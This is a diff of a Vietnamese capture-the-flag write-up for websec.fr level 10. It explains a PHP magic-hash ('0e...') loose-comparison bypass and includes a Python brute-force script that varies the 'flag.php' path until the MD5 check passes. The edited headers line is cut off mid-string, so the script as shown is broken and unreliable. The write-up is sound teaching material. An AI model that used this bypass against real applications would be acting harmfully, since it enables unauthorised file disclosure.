@@ -33,7 +33,7 @@ Nếu giá trị 0e... được tạo ra bởi hàm md5() và được so sánh 
 
 Vì cách thức hoạt động của md5 khá phức tạp (các bạn có thể tham khảo tại: https://vi.wikipedia.org/wiki/MD5) nên ý nghĩ đầu tiên là brute-force bằng cách chỉnh sửa các giá trị truyền vào hàm md5() đến khi nào có được giá trị 0e... :D
 
-Ta có liên tục thêm './' vào trước 'flag.php' thông qua param 'f' của biến $_REQUEST['f'] đến khi nào ra được giá trị mong muốn.
+Ta có liên tục thêm './' vào trước 'flag.php' thông qua param 'f' của biến $_REQUEST['f'] đến khi nào ra được giá trị mong muốn. Nhưng nếu làm thế sẽ tăng độ dài của tham số truyền vào và vượt mức cho phép của Apache nên ta có thể thay thế bằng "." + "/"*i + "flag.php"
 
 Mình sẽ viết script để exploit bằng python
 
@@ -41,7 +41,7 @@ Mình sẽ viết script để exploit bằng python
 import requests
 
 burp0_url = "https://websec.fr:443/level10/index.php"
-burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Chromium\";v=\"106\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://websec.fr", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://websec.fr/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
+burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Chromium\";v=\"106\"", "Sec-Ch-Ua-Mobile": ">
 filename = "flag.php"
 i = 1
 while True:
@@ -52,8 +52,9 @@ while True:
           break
      else:
           print("Test: ", i)
-     filename = "./"*i + "flag.php"
+     filename = "." + "/"*i + "flag.php"
      i = i + 1
+
 ```
 
 Brute-force sẽ hơi mất nhiều thời gian, nhưng chờ đợi là hạnh phúc :DD
